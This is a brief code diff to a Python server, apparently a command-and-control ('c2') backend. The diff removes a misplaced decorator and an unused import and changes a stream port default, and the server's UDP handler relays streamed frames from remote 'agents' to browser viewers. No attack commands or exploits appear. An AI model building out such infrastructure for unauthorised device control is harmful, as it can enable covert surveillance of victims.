@@ -9,7 +9,6 @@ import subprocess
 import shutil
 import struct
 import uuid
-from contextlib import asynccontextmanager
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from collections import deque
 from fastapi.responses import HTMLResponse, PlainTextResponse, JSONResponse
@@ -20,7 +19,7 @@ logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s  %(m
 logger = logging.getLogger("c2")
 
 HTTP_PORT = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", "80")))
-STREAM_PORT = int(os.environ.get("STREAM_PORT", str(HTTP_PORT + 1000)))
+STREAM_PORT = int(os.environ.get("STREAM_PORT", "1000"))
 
 _udp_frag_buf = {}  # device_id -> {seq: {frags: {}, total: int, ts: float}}
 _UDP_FRAG_TIMEOUT = 10.0
@@ -53,7 +52,6 @@ def _ws_payload(msg: dict):
     return ("skip", None)
 
 
-@asynccontextmanager
 class UDPStreamProtocol(asyncio.DatagramProtocol):
     """Receives stream frames from agents via UDP and relays to browser viewers."""
 
